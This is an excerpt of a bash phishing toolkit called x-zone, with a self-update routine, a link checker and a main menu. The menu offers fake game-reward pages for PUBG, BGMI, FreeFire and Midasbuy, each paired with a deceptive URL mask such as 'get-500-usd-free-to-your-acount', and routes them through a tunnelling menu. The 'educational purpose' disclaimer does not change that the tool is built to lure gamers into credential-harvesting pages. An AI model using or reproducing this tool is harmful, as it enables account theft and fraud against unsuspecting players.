##TOOL CREATED BY RABIKISHAN RAUNIYAR 
##TOOL CREATED FOR EDUCATIONAL PURPOSE DON'T MISUSE IT AUTHOR WILL NOT BE RESPONSIBLE IF YOU MISUE IT
...
check_update(){
	...
	relase_url='https://api.github.com/repos/rabikishanr/x-zone/releases/latest'
	...
	if [[ $new_version != $__version__ ]]; then
		...
		if [[ -e ".x-zone.tar.gz" ]]; then
			tar -xf .x-zone.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
			rm -f .x-zone.tar.gz
			popd > /dev/null 2>&1
			{ sleep 3; clear; banner_small; }
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run x-zone again\n\n"${WHITE}
			{ reset_color ; exit 1; }
		else
...
banner() {
	cat <<- EOF
		...
		${GREEN}[${WHITE}-${GREEN}]${YELLOW} TOOL CREATED FOR EDUCATIONAL PURPOSE ONLY!!! ${WHITE}
	EOF
}
...
## URL Shortner
site_stat() {
    [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"
}
...
main_menu() {
	...
	case $REPLY in 
        1)
			website="MUMMY"
			mask='https://PUBG-FREE-GIFT-SPIN-MUMMY-SUIT'
			tunnel_menu;;
		2)
			website="SPIN"
			mask='https://unlimited-PUBG-MObile-SPIN'
			tunnel_menu;;
		3)
			website="X-SUIT(BGMI)"
			mask='https://BGMI-FREE-GIFT-SPIN-MUMMY-SUIT'
			tunnel_menu;;
		4)
			website="GLACIER"
			mask='https://BGMI-FREE-GIFT-GLACIER-SPIN-FREE'
			tunnel_menu;;
		5)
			website="FREEFIRE"
			mask='https://FREE-GIFT-COLLECT-FFMAX'
			tunnel_menu;;
		6)
			website="GLACIER(PUBG)"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		7)
			website="MIDASBUY(OLDxPUBG)"
			mask='https://quora-premium-for-free'
			tunnel_menu;;
		8)
			website="WRAITHFUL-EVENT"
